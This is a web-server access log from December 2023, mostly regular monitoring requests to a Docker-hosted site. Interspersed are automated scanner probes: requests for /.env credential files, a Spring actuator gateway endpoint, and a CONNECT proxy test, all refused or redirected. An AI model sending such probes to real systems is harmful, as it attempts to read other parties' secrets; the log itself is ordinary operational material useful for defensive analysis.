167.71.120.76 - - [21/Dec/2023:04:46:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4212 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4213 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:47:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4214 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4215 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:48:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4216 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4217 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:49:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4218 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4219 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:50:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4220 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4221 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:51:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4222 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4223 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:52:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4224 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4225 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:53:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4226 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4227 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:54:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4228 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4229 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:55:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4230 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4231 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:56:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4232 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4233 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:57:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4234 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4235 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:58:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4236 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4237 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:59:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4238 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:04:59:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4239 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4240 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:00:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4241 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4242 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:01:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4243 "www@docker" "http://172.20.0.9:80" 0ms
83.97.73.87 - - [21/Dec/2023:05:01:35 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 4244 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4245 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:02:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4246 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4247 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:03:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4248 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4249 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:04:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4250 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4251 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:05:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4252 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4253 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:06:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4254 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4255 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:07:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4256 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4257 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:08:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4258 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4259 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:09:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4260 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4261 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:10:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4262 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4263 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:11:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4264 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4265 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:12:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4266 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4267 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:13:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4268 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [21/Dec/2023:05:13:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4269 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [21/Dec/2023:05:13:55 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4270 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4271 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:14:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4272 "www@docker" "http://172.20.0.9:80" 0ms
45.79.168.172 - - [21/Dec/2023:05:15:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4273 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4274 "www@docker" "http://172.20.0.9:80" 0ms
172.104.11.34 - - [21/Dec/2023:05:15:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4275 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:05:15:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4276 "www@docker" "http://172.20.0.9:80" 0ms
205.210.31.83 - - [21/Dec/2023:05:15:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4277 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4278 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:16:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4279 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4280 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:17:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4281 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4282 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:18:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4283 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4284 "www@docker" "http://172.20.0.9:80" 0ms
83.97.73.87 - - [21/Dec/2023:05:19:30 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 4285 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:05:19:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4286 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4287 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:20:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4288 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4289 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:21:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4290 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4291 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:22:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4292 "www@docker" "http://172.20.0.9:80" 3ms
159.203.109.206 - - [21/Dec/2023:05:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4293 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:23:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4294 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4295 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:24:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4296 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [21/Dec/2023:05:24:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4297 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4298 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:25:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4299 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4300 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:26:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4301 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4302 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:27:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4303 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4304 "www@docker" "http://172.20.0.9:80" 1ms
90.151.171.106 - - [21/Dec/2023:05:28:24 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 4305 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:05:28:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4306 "www@docker" "http://172.20.0.9:80" 0ms
90.151.171.106 - - [21/Dec/2023:05:28:33 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 4307 "web-to-websecure@internal" "-" 0ms
45.79.163.53 - - [21/Dec/2023:05:29:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4308 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4309 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:29:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4310 "www@docker" "http://172.20.0.9:80" 0ms
54.37.79.75 - - [21/Dec/2023:05:29:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4311 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:05:29:41 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4312 "web-to-websecure@internal" "-" 0ms
45.79.172.21 - - [21/Dec/2023:05:29:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4313 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4314 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:30:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4315 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4316 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:31:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4317 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4318 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:32:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4319 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4320 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:33:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4321 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4322 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:34:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4323 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4324 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:35:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4325 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4326 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:36:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4327 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4328 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:37:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4329 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4330 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:38:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4331 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4332 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:39:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4333 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4334 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:40:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4335 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4336 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:41:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4337 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4338 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:42:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4339 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4340 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:43:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4341 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [21/Dec/2023:05:43:47 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4342 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [21/Dec/2023:05:43:47 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4343 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4344 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:44:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4345 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4346 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:45:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4347 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4348 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:46:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4349 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4350 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:47:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4351 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4352 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:48:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4353 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4354 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:49:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4355 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4356 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:50:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4357 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4358 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:51:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4359 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4360 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:52:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4361 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4362 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:53:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4363 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:05:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4364 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4365 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4366 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:55:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4367 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4368 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:05:56:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4369 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4370 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:57:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4371 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:05:57:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4372 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:05:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4373 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:58:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4374 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:05:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4375 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:05:59:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4376 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:06:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4377 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:06:00:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4378 "www@docker" "http://172.20.0.9:80" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4379 "web-to-websecure@internal" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:05 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 4380 "web-to-websecure@internal" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:05 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 4381 "web-to-websecure@internal" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:06 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 4382 "web-to-websecure@internal" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:06 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 4383 "web-to-websecure@internal" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4384 "-" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:15 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 4385 "-" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:15 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 4386 "-" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:15 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 4387 "-" "-" 0ms
185.165.190.17 - - [21/Dec/2023:06:01:15 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4388 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:06:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4389 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:06:01:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4390 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [21/Dec/2023:06:01:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4391 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:06:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4392 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:06:02:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4393 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:06:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4394 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:06:03:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4395 "www@docker" "http://172.20.0.9:80" 0ms
